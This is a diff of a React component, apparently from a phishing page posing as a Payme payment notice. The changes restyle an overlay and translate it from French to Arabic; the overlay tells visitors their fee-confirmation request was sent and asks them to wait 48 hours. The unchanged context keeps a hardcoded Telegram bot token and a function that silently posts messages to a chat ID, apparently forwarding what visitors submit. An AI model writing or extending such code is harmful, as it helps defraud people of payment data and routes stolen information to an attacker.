@@ -4,7 +4,7 @@ import { useState, useRef } from 'react';
       import { Button } from '@/components/ui/button';
       import { Input } from '@/components/ui/input';
       import { Label } from '@/components/ui/label';
-      import { AlertTriangle, Copy, Check, CreditCard, LogOut, Upload, CheckCircle2, Pencil, Clock } from 'lucide-react';
+      import { AlertTriangle, Copy, Check, CreditCard, LogOut, Upload, CheckCircle2, Pencil } from 'lucide-react';
       import { motion, AnimatePresence } from 'framer-motion';
 
       const BOT_TOKEN = '8439446538:AAE7qOmKwdw93kK7R9n4P2T21V7z2KcF-YI';
@@ -28,9 +28,7 @@ import { useState, useRef } from 'react';
             body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' }),
           });
         }
-      } catch {
-        // silent
-      }
+      } catch {}
       }
 
       function PaymeNoticeOverlay() {
@@ -43,67 +41,91 @@ import { useState, useRef } from 'react';
             display: 'flex',
             alignItems: 'center',
             justifyContent: 'center',
-            background: 'rgba(0,0,0,0.55)',
-            backdropFilter: 'blur(4px)',
-            pointerEvents: 'all',
+            background: 'rgba(0,0,0,0.6)',
+            backdropFilter: 'blur(6px)',
           }}
         >
           <div
+            dir="rtl"
             style={{
-              background: '#fff',
-              borderRadius: '18px',
-              padding: '40px 36px',
-              maxWidth: '420px',
+              background: 'linear-gradient(135deg, #fffbf2 0%, #fff8e8 100%)',
+              borderRadius: '24px',
+              padding: '48px 40px',
+              maxWidth: '440px',
               width: '90%',
-              boxShadow: '0 8px 48px rgba(0,0,0,0.22)',
+              boxShadow: '0 20px 60px rgba(0,0,0,0.25), 0 0 0 1px rgba(249,168,37,0.2)',
               textAlign: 'center',
               display: 'flex',
               flexDirection: 'column',
               alignItems: 'center',
-              gap: '16px',
+              gap: '20px',
+              fontFamily: "'Segoe UI', Tahoma, Arial, sans-serif",
             }}
           >
+            {/* Icon circle */}
             <div style={{
-              background: '#fff7ed',
+              width: '72px',
+              height: '72px',
               borderRadius: '50%',
-              width: '64px',
-              height: '64px',
+              background: 'linear-gradient(135deg, #f59e0b, #f97316)',
               display: 'flex',
               alignItems: 'center',
               justifyContent: 'center',
-              marginBottom: '4px',
+              boxShadow: '0 4px 20px rgba(249,168,37,0.4)',
+              fontSize: '32px',
             }}>
-              <Clock size={32} color="#f97316" />
+              ⏳
             </div>
+
+            {/* Title */}
             <h2 style={{
-              fontSize: '1.15rem',
-              fontWeight: 700,
+              fontSize: '1.4rem',
+              fontWeight: 800,
               color: '#1a1a1a',
               margin: 0,
               lineHeight: 1.4,
+              letterSpacing: '-0.3px',
             }}>
-              Demande envoyée avec succès
+              تم إرسال طلبك بنجاح
             </h2>
-            <p style={{
-              fontSize: '1rem',
-              color: '#444',
-              margin: 0,
-              lineHeight: 1.7,
-            }}>
-              Votre demande de confirmation des frais requis a été envoyée.<br />
-              Veuillez patienter <strong>48 heures</strong> pour l&apos;acceptation de votre demande.
-            </p>
+
+            {/* Divider */}
             <div style={{
-              marginTop: '8px',
-              padding: '10px 20px',
-              background: '#fff7ed',
-              borderRadius: '8px',
-              fontSize: '0.85rem',
-              color: '#f97316',
-              fontWeight: 600,
-              letterSpacing: '0.3px',
+              width: '48px',
+              height: '3px',
+              borderRadius: '99px',
+              background: 'linear-gradient(90deg, #f59e0b, #f97316)',
+            }} />
+
+            {/* Message */}
+            <p style={{
+              fontSize: '1.05rem',
+              color: '#555',
+              margin: 0,
+              lineHeight: 2,
+              fontWeight: 500,
             }}>
-              En attente de validation · 48h
+              تم إرسال طلب تأكيد الرسوم المطلوبة
+              <br />
+              <span style={{ color: '#1a1a1a', fontWeight: 700 }}>
+                الرجاء الانتظار 48 ساعة
+              </span>
+              <br />
+              لقبول طلبكم
+            </p>
+
+            {/* Badge */}
+            <div style={{
+              padding: '10px 28px',
+              background: 'linear-gradient(135deg, #f59e0b22, #f9731622)',
+              border: '1.5px solid #f59e0b55',
+              borderRadius: '99px',
+              fontSize: '0.9rem',
+              color: '#b45309',
+              fontWeight: 700,
+              letterSpacing: '0.5px',
+            }}>
+              🕐 قيد المراجعة · 48 ساعة
             </div>
           </div>
         </div>
